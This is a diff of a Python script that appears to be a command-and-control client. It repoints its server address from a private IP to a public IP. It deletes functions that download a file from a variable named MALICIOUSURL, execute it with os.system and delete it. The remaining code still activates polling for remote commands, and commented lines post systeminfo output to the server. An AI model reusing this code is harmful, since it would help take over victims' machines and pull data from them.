@@ -4,7 +4,7 @@ import sys, string, os
 import subprocess
 import datetime
 
-SERVERADDRESS = 'http://10.100.102.5'
+SERVERADDRESS = 'http://104.237.4.83'
 CONFIGURATIONPATH = '/Configuration'
 HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
 COMMANDSTOEXE = None
@@ -96,39 +96,8 @@ def Activate():
             except:
                 None
 
-
-
-
-def DownloadFile(url):
-    #file = url.split('/')[-1]+'.exe'
-    #r = requests.Session()
-    # NOTE the stream=True parameter
-    try:
-        r = requests.get(url, stream=True, headers=HEADERS)
-        file = r.headers['Filename']
-        with open(file, 'wb') as f:
-            for chunk in r.iter_content(chunk_size=1024):
-                if chunk: # filter out keep-alive new chunks
-                    f.write(chunk)
-                        #f.flush() commented by recommendation from J.F.Sebastian
-        return file
-    except:
-        None
-    return None
-
-
-def RunExeFile(file):
-    if os.path.isfile(file):
-        try:
-            os.system(file)
-            os.remove(file)
-        except:
-            None
-    return
-
 conf()
 Activate()
-RunExeFile(DownloadFile(MALICIOUSURL))
 #print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))
 
 #HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))
